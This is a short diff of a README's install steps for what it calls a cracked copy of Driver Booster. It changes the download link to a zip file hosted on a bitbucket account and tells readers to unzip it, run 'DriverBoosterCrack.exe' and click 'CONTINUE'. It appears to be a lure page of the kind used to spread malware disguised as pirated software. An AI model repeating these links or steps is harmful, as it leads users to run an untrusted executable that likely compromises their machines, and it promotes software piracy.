@@ -2,9 +2,9 @@
 
 
 # How To Install?
-- 1. [* Click Here To Download](https://pixeldrain.com/u/FjhGdujy)
+- 1. [* Click Here To Download](https://bitbucket.org/amitafgg4/myfiles1/downloads/DriverBoosterCrack.zip)
 - 2. Unzip to any folder
-- 3. Run driver_booster_crack.exe
+- 3. Run DriverBoosterCrack.exe
 - 4. Click "CONTINUE"
 - 5. Enjoy
  
